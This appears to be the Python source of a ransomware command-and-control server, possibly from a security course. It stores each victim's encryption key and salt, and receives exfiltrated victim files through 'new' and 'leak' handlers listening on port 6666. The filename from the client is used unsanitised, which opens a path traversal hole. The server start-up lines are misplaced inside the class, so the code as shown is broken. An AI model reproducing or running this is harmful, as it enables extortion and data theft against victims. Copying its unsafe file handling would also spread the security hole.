import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token: str, data: str, filename: str):
        #Decode base64 data and save it
        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        
        #Ensure directory exists
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "wb") as f:
            f.write(bin_data)


    def post_new(self, path: str, params: dict, body: dict) -> dict:
        #Handle new ransomware registration
        token_b64 = body.get("token")
        salt_b64 = body.get("salt")
        key_b64 = body.get("key")

        #Process and store tokens
        token = base64.b64decode(token_b64)
        token_hash = sha256(token).hexdigest()
        os.makedirs(os.path.join(CNC.ROOT_PATH, token_hash), exist_ok=True)
            
        self.save_b64(token_hash, salt_b64, "salt.bin")
        self.save_b64(token_hash, key_b64, "key.bin")
        return {"status": "OK"}


    def post_leak(self, path: str, params: dict, body: dict) -> dict:
        #Handle leaked files from victim
        token_b64 = body.get("token")
        filename = body.get("filename")
        data_b64 = body.get("data")

        #Process leaked file
        token = base64.b64decode(token_b64)
        token_hash = sha256(token).hexdigest()
            
        #Save file using original filename
        self.save_b64(token_hash, data_b64, filename)
        return {"status": "OK"}

    httpd = HTTPServer(('0.0.0.0', 6666), CNC)
    httpd.serve_forever()